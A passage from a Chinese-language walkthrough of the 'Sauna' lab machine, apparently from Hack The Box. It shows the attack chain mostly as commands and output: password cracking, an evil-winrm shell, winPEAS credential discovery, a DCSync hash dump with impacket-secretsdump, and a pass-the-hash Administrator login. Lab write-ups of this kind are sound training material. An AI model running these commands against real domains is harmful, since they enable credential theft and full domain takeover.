Speed.#01........:  3923.2 kH/s (1.57ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 31629312/43033155 (73.50%)
Rejected.........: 0/31629312 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:2 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Teague51
Hardware.Mon.#01.: Util: 56%

Started: Tue Apr 21 06:04:59 2026
Stopped: Tue Apr 21 06:05:11 2026

```

爆破出密码为 `Thestrokes23`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ evil-winrm -i egotistical-bank.local -u fsmith -p 'Thestrokes23'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
*Evil-WinRM* PS C:\Users\FSmith\Documents> gci c:\Users\ -Filter *.txt -File -Recurse
Access to the path 'C:\Users\Administrator' is denied.
At line:1 char:1
+ gci c:\Users\ -Filter *.txt -File -Recurse
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/21/2026   9:18 AM             34 user.txt
Access to the path 'C:\Users\Public' is denied.
At line:1 char:1
+ gci c:\Users\ -Filter *.txt -File -Recurse
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Public:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Access to the path 'C:\Users\svc_loanmgr' is denied.
At line:1 char:1
+ gci c:\Users\ -Filter *.txt -File -Recurse
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\svc_loanmgr:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

找到 user flag。

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> type C:\Users\FSmith\Desktop\user.txt
c35a02c3c891654*******ea2039be3f
```

## Windows 提权

准备好 `winPEAS.exe`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ ls -liah winPEAS.exe  
2768940 -rw-rw-r-- 1 kali kali 9.7M Apr 21 06:17 winPEAS.exe
```

传至靶机并执行，保存结果。

```bash
*Evil-WinRM* PS C:\programdata\apps> .\winPEAS.exe log
"log" argument present, redirecting output to file "out.txt"
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/21/2026  11:05 AM         127766 out.txt
```

发现 `svc_loanmanager` 暴露了明文密码。

![](Pasted%20image%2020260421212631.png)

验证凭据，登入失败。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ crackmapexec smb 10.129.22.120 -u svc_loanmanager -p 'Moneymakestheworldgoround!'
SMB         10.129.22.120   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.22.120   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\svc_loanmanager:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
```

继续阅读 Winpeas 的结果发现用户实际为 `svc_loanmgr`。

![](Pasted%20image%2020260421212840.png)

再次验证，成功。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ crackmapexec smb 10.129.22.120 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
SMB         10.129.22.120   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.22.120   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
```

使用 bloodhound 收集信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ bloodhound-python -c All -u svc_loanmgr -p 'Moneymakestheworldgoround!' -ns 10.129.22.120 -d egotistical-bank.local --zip                                                                                                                                
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::1908:2eaa:e194:5ea5
INFO: Trying LDAP connection to dead:beef::1908:2eaa:e194:5ea5
INFO: Testing resolved hostname connectivity dead:beef::8b
INFO: Trying LDAP connection to dead:beef::8b
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::1908:2eaa:e194:5ea5
INFO: Trying LDAP connection to dead:beef::1908:2eaa:e194:5ea5
INFO: Testing resolved hostname connectivity dead:beef::8b
INFO: Trying LDAP connection to dead:beef::8b
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 30S
INFO: Compressing output into 20260421093238_bloodhound.zip
                                                                                                                               
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ ls -liah 20260421093238_bloodhound.zip 
2766434 -rw-rw-r-- 1 kali kali 139K Apr 21 09:33 20260421093238_bloodhound.zip
```

浏览了一圈未发现有用的信息。

执行 `secretsdump` 暴露出 `administrator` 的 hash。

```bash
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ impacket-secretsdump -just-dc egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.22.120
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:107983a00ee44777ecd57b33b6caed05:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:9494462d4080b6a0abcef757f627c17b2aa14822ea0ef7281ed1a46119bfc950
SAUNA$:aes128-cts-hmac-sha1-96:ce8abe15851e50bcfa804121824bae56
SAUNA$:des-cbc-md5:89237a5dfed60416
[*] Cleaning up...
```

登陆拿到权限 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ evil-winrm -i 10.129.22.120 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5183e6faa81a508920196120306ef1c2
```
